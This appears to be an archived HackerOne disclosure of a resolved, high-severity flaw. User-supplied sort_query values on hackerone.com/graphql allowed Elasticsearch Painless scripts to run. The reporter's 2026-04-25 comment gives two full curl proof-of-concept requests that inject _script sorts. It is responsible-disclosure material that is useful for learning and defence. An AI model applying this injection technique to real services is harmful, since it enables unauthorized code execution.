---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
substate: "resolved"
weakness: "Code Injection"
enriched: true
date: 2026-06-17
submitted: 2026-04-24T19:35:18.760Z
bounty_usd: 7000
votes: 174
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "brumbelow"
source: "https://hackerone.com/reports/3694007"
title: "Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql"
---
# Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql

> **Severity:** High | **Bounty:** 7,000 USD | **Votes:** 174 | **Program:** HackerOne | **Disclosed:** 2026-06-17

- Report: [https://hackerone.com/reports/3694007](https://hackerone.com/reports/3694007)
- CWE: Code Injection
- Submitted: 2026-04-24T19:35:18.760Z

## Timeline

- **Report Filed**
- **2026-04-24** @hackerone-agent: Hello @brumbelow,

Thank you for your submission!

Your report has passed the preliminary review. Please note that this does not confirm validation, the status may change after further review.

Next in the workflow is for our team to validate and reproduce the issue, evaluating its accuracy and security impact. You will be notified when the team has reviewed and made an assessment on your report.

We'll keep you updated as the process moves forward. Have a great day!

Thanks,
hackerone-agent
- **2026-04-24** @brumbelow: Note: I did not set a custom header as I was using single requests with curl. `x-request-id `s for all requests mentioned above are saved locally though and I am happy to provide those if needed. 

All testing came from one session and one IP address (████████). I hope that helps!

Thank you for your time

Best

AB
- **2026-04-25** @brumbelow: The easiest immediate way to see the Painless script execution is just Step 4.

To explain a little more clearly, here are both requests without the GraphQL variables so you can see each full request:

**Request A**
```bash
curl -sk 'https://hackerone.com/graphql' \
  -H @/tmp/h1.headers \
  -b "$COOKIE" \
  --data-raw '{"query":"query($sq:String){search(index:NotificationsIndex,query_string:\"*\",sort_query:$sq,size:5){edges{cursor node{__typename ... on NotificationDocument{id}}}}}","variables":{"sq":"[{\"_script\":{\"type\":\"number\",\"script\":{\"source\":\"1\",\"lang\":\"painless\"},\"order\":\"asc\"}}]"}}'
```

**Request B**
```bash
curl -sk 'https://hackerone.com/graphql' \
  -H @/tmp/h1.headers \
  -b "$COOKIE" \
  --data-raw '{"query":"query($sq:String){search(index:NotificationsIndex,query_string:\"*\",sort_query:$sq,size:5){edges{cursor node{__typename ... on NotificationDocument{id}}}}}","variables":{"sq":"[{\"_script\":{\"type\":\"number\",\"script\":{\"source\":\"doc[\\\"_seq_no\\\"].value\",\"lang\":\"painless\"},\"order\":\"asc\"}}]"}}'
```

### What these do

Both requests perform an authenticated search against my own `NotificationsIndex` in Elasticsearch. Each notification is a "document" in ES terminology, which is a single indexed record. Both requests select the first 5 documents and ask Elasticsearch to sort them according to a `_script` directive embedded in `sort_query`.

**Request A** supplies a Painless script whose source is the literal int `1`. Every document evaluates to the same constant sort value, so all documents tie. Elasticsearch falls back to its default tiebreaker ordering and returns 5 documents in that order.

**Request B** supplies a script whose source is `doc["_seq_no"].value`, this is a per-document field read against Elasticsearch's internal `_seq_no` metadata field, which assigns a unique monotonically-increasing sequence number to each document at index time. Each document evaluates to a different sort value (its own `_seq_no`), so the result is ordered ascending by sequence number. (i.e. oldest documents first.)

The two responses share zero overlapping documents in the first 5 positions. Request B's ordering also matches the response from a separate, unrelated `sort_query: '[{"id":"asc"}]'` test (same 5 IDs in the same order), confirming the script returned `_seq_no` values that produced an ascending-by-id-equivalent ordering.

This difference is only explainable by Painless script executing per-document via a user controlled value.
- **2026-04-27** @brumbelow: Hi just following up here because of the severity. 

Please let me know if anything else is needed from me 

Thank you in advance!
- **2026-04-28** @h1_analyst_aaron: Hi @brumbelow - The team is still looking into this report and will update you once there is additional information to share. Thanks for your patience!
- **Report Pending Program Review**
- **2026-04-28** @brumbelow: Hi @z0x01 thanks for the quick response and update!

To answer your question directly: no, I did not extract any other data from tenants. However, I would like to note that I did not attempt to as I did not want to violate the testing guidelines. 
> "Immediate stop when impact detected"

I stopped at my minimal PoC  in report once I believed I had proven code execution capability. DoS is definitely a real impact here but (imo) a secondary one to the code execution on H1 infra. 

I hope that is helpful please let me know if I can assist further! Happy to do whatever. 

Best

AB
- **Report Triaged**
- **2026-04-28** @z0x01: I brought the report to be triaged, as this best reflects the current state. We are still working on the impact assessment and will be sure to keep you posted.
- **2026-04-28** @brumbelow: Thanks very much, it is much appreciated! Standing by
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Retesting**
- **User Completed Retest**
- **2026-05-01** @brumbelow: Thanks so much for the quick fix and triage, as well as the generous bounty. It is appreciated!

It has been my pleasure

Hope to speak again soon :)

Best,
AB
- **Report Retest Approved**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
